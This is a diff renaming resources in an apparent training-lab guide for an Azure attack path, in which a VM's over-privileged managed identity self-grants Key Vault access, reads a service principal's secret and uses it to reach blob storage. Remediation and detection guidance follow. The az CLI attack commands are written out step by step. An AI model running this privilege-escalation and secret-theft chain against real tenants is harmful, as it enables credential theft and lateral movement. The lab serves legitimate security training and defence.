@@ -1,14 +1,14 @@
 # AP02 — Over-privileged Managed Identity → Key Vault secret → lateral movement
 
 - **Layer:** Azure (Managed Identity · Key Vault · Storage)
-- **Cost:** low — `Standard_B1s` VM (~7.6 USD/month) + standard public IP (~3.65 USD/month) + Key Vault/Storage for pennies; per session with `azrange.ps1 destroy`: ~0.05–0.20 USD. The only AP in the skeleton that bills compute → demands teardown discipline.
+- **Cost:** low — `Standard_B1s` VM (~7.6 USD/month) + standard public IP (~3.65 USD/month) + Key Vault/Storage for pennies; per session with `aether.ps1 destroy`: ~0.05–0.20 USD. The only AP in the skeleton that bills compute → demands teardown discipline.
 - **MITRE ATT&CK:** [T1552.005](https://attack.mitre.org/techniques/T1552/005/) (Unsecured Credentials: Cloud Instance Metadata API) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts) · [T1580](https://attack.mitre.org/techniques/T1580/) (Cloud Infrastructure Discovery) · [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)
 - **Maps to cert:** CARTP / CARTE
 - **Precondition seeded by the range:**
-  - Linux VM `azrange-ap02-web` (Ubuntu 22.04 LTS) with a **system-assigned managed identity** and initial access represented by a lab credential (admin + `random_password`, SSH/22 open on the NSG) — simulates a prior RCE/webshell.
-  - The VM's MI holds **`Contributor` over the entire resource group `azrange-ap02-rg`** (deliberate excess privilege).
-  - Key Vault `azrange-ap02-kv-<rand>` in the **access-policy** model (legacy), `purge_protection_enabled = false`, `soft_delete_retention_days = 7`, which safeguards the secret `automation-sp-secret` = the *client secret* of the service principal `azrange-ap02-automation`.
-  - SP `azrange-ap02-automation` with **`Storage Blob Data Contributor`** over the storage account `azrangeap02data<rand>`, whose `loot` container holds the loot blob `flag.txt`.
+  - Linux VM `aether-ap02-web` (Ubuntu 22.04 LTS) with a **system-assigned managed identity** and initial access represented by a lab credential (admin + `random_password`, SSH/22 open on the NSG) — simulates a prior RCE/webshell.
+  - The VM's MI holds **`Contributor` over the entire resource group `aether-ap02-rg`** (deliberate excess privilege).
+  - Key Vault `aether-ap02-kv-<rand>` in the **access-policy** model (legacy), `purge_protection_enabled = false`, `soft_delete_retention_days = 7`, which safeguards the secret `automation-sp-secret` = the *client secret* of the service principal `aether-ap02-automation`.
+  - SP `aether-ap02-automation` with **`Storage Blob Data Contributor`** over the storage account `aetherap02data<rand>`, whose `loot` container holds the loot blob `flag.txt`.
   - Entirely wired by Terraform (`enable_ap02 = true`), 100% declarative — no post-deployment seed.
 
 ---
@@ -23,7 +23,7 @@ For the student to internalize that **a managed identity is not a safe: it is a 
 
 Training level. Public reference tooling: **az cli**, **MicroBurst** (`Get-AzPasswords`), **ROADtools**, **pacu**.
 
-1. **Initial host access** (seeded by the range — represents a prior RCE/webshell). SSH to `azrange-ap02-web` with the lab credential declared in Terraform (port 22 open on the NSG):
+1. **Initial host access** (seeded by the range — represents a prior RCE/webshell). SSH to `aether-ap02-web` with the lab credential declared in Terraform (port 22 open on the NSG):
    ```bash
    ssh <admin_username>@<ap02_vm_public_ip>
    ```
@@ -51,36 +51,36 @@ Training level. Public reference tooling: **az cli**, **MicroBurst** (`Get-AzPas
 
 4. **Enumeration with the MI's identity (T1580 / T1078.004).** With the ARM token, inventory the RG and discover the vault and the storage account:
    ```bash
-   az resource list -g azrange-ap02-rg -o table
-   # → Key Vault azrange-ap02-kv-<rand> and storage azrangeap02data<rand>
+   az resource list -g aether-ap02-rg -o table
+   # → Key Vault aether-ap02-kv-<rand> and storage aetherap02data<rand>
    ```
 
 5. **Self-grant / excess-privilege abuse (T1098).** The MI is `Contributor` over the RG and the vault is in **access-policy** mode with no data permission for the MI. `Contributor` includes `...accessPolicies/write`, so the MI rewrites the vault's own access policy to grant itself secret reads (classic CARTP technique):
    ```bash
-   az keyvault set-policy --name azrange-ap02-kv-<rand> \
+   az keyvault set-policy --name aether-ap02-kv-<rand> \
      --object-id <mi-principalId> \
      --secret-permissions get list
    ```
 
 6. **Secret exfiltration (T1552.005).** Read the SP's *client secret*:
    ```bash
-   az keyvault secret show --vault-name azrange-ap02-kv-<rand> \
+   az keyvault secret show --vault-name aether-ap02-kv-<rand> \
      --name automation-sp-secret --query value -o tsv
    # REST equivalent (data plane, with the vault.azure.net token):
-   # GET https://azrange-ap02-kv-<rand>.vault.azure.net/secrets/automation-sp-secret?api-version=7.4
+   # GET https://aether-ap02-kv-<rand>.vault.azure.net/secrets/automation-sp-secret?api-version=7.4
    #      Authorization: Bearer <token-vault>
    ```
 
-7. **Lateral movement to a second identity (T1078.004).** The secret does not yield data directly: it yields a **distinct, broader-scope identity**. Sign in as the SP `azrange-ap02-automation` — the jump from "ephemeral token bound to the host" to "reusable cloud-account credential":
+7. **Lateral movement to a second identity (T1078.004).** The secret does not yield data directly: it yields a **distinct, broader-scope identity**. Sign in as the SP `aether-ap02-automation` — the jump from "ephemeral token bound to the host" to "reusable cloud-account credential":
    ```bash
-   az login --service-principal -u <appId azrange-ap02-automation> \
+   az login --service-principal -u <appId aether-ap02-automation> \
      -p <secret> --tenant <tenantId>
    ```
 
-8. **Trophy.** The SP holds `Storage Blob Data Contributor` over `azrangeap02data<rand>`. Downloading the loot proves the crossing of the trust boundaries `VM → MI → Key Vault → SP → data`:
+8. **Trophy.** The SP holds `Storage Blob Data Contributor` over `aetherap02data<rand>`. Downloading the loot proves the crossing of the trust boundaries `VM → MI → Key Vault → SP → data`:
    ```bash
    # Without --file, az dumps the blob contents to stdout (az >= 2.40):
-   az storage blob download --account-name azrangeap02data<rand> \
+   az storage blob download --account-name aetherap02data<rand> \
      --container-name loot --name flag.txt --auth-mode login
    ```
 
@@ -93,18 +93,18 @@ Training level. Public reference tooling: **az cli**, **MicroBurst** (`Get-AzPas
    # Remove the excessive role assignment:
    Remove-AzRoleAssignment -ObjectId <mi-principalId> `
      -RoleDefinitionName "Contributor" `
-     -Scope "/subscriptions/<sub>/resourceGroups/azrange-ap02-rg"
+     -Scope "/subscriptions/<sub>/resourceGroups/aether-ap02-rg"
 
    # Grant secret read only (RBAC model, scoped to the vault):
    New-AzRoleAssignment -ObjectId <mi-principalId> `
      -RoleDefinitionName "Key Vault Secrets User" `
-     -Scope "/subscriptions/<sub>/resourceGroups/azrange-ap02-rg/providers/Microsoft.KeyVault/vaults/azrange-ap02-kv-<rand>"
+     -Scope "/subscriptions/<sub>/resourceGroups/aether-ap02-rg/providers/Microsoft.KeyVault/vaults/aether-ap02-kv-<rand>"
    ```
 
 2. **Migrate the Key Vault from access-policy to RBAC** (`enable_rbac_authorization = true`). Under RBAC, `Contributor` alone grants **no** data-plane access **nor** the ability to self-assign data roles (that requires `User Access Administrator` or `Owner`). This eliminates the self-grant that makes the path exploitable:
    ```powershell
-   Update-AzKeyVault -VaultName azrange-ap02-kv-<rand> `
-     -ResourceGroupName azrange-ap02-rg -EnableRbacAuthorization $true
+   Update-AzKeyVault -VaultName aether-ap02-kv-<rand> `
+     -ResourceGroupName aether-ap02-rg -EnableRbacAuthorization $true
    ```
 
 3. **Do not store long-lived secrets (SP client secrets) in Key Vault.** Prefer managed identities / workload identity federation. If the secret must exist: short rotation and RBAC-scoped data access.
@@ -124,7 +124,7 @@ Training level. Public reference tooling: **az cli**, **MicroBurst** (`Get-AzPas
 
 6. **Harden the host.** Do not expose port 22 to the Internet: restrict the NSG to management IPs or use Azure Bastion; limit egress and apply JIT.
 
-7. **In the range:** `./azrange.ps1 reset` (equivalent to `terraform apply` with `-var enable_ap02=false`) re-applies the declared state and **reverts the access policy the attacker modified outside Terraform**. Manual alternative: `az keyvault delete` + `az keyvault purge`.
+7. **In the range:** `./aether.ps1 reset` (equivalent to `terraform apply` with `-var enable_ap02=false`) re-applies the declared state and **reverts the access policy the attacker modified outside Terraform**. Manual alternative: `az keyvault delete` + `az keyvault purge`.
 
 > **Teardown warning.** If during the exercise you manually escalate to `Contributor` at **subscription** scope, that role assignment **is not managed by Terraform** and must be cleaned up by hand.
 
@@ -139,9 +139,9 @@ The IMDS call leaves no log; the telltale events are **downstream**, in the **Ke
 
 Complementary hunting signals:
 - **`OperationName == "VaultPatch"` in `AzureDiagnostics` (Key Vault AuditEvent) — or `Microsoft.KeyVault/vaults/accessPolicies/write` in `AzureActivity` — whose initiating identity is a managed identity** — an MI rewriting the access policy of the vault it lives in is almost always a self-grant.
-- Tight temporal sequence: `set-policy` → `SecretGet` of `automation-sp-secret` by the same `objectId`, followed by an SP `az login` and accesses to `azrangeap02data<rand>`.
+- Tight temporal sequence: `set-policy` → `SecretGet` of `automation-sp-secret` by the same `objectId`, followed by an SP `az login` and accesses to `aetherap02data<rand>`.
 - `Microsoft.Authorization/roleAssignments/write` granting `Contributor` to a compute identity (provisioning anomaly).
-- Authentication of the SP `azrange-ap02-automation` from an IP/ASN other than the host's or the legitimate pipeline's (credential reused after theft).
+- Authentication of the SP `aether-ap02-automation` from an IP/ASN other than the host's or the legitimate pipeline's (credential reused after theft).
 - Access to blobs in the `loot` container with `--auth-mode login` by an SP that does not normally touch that storage.
 
 ---
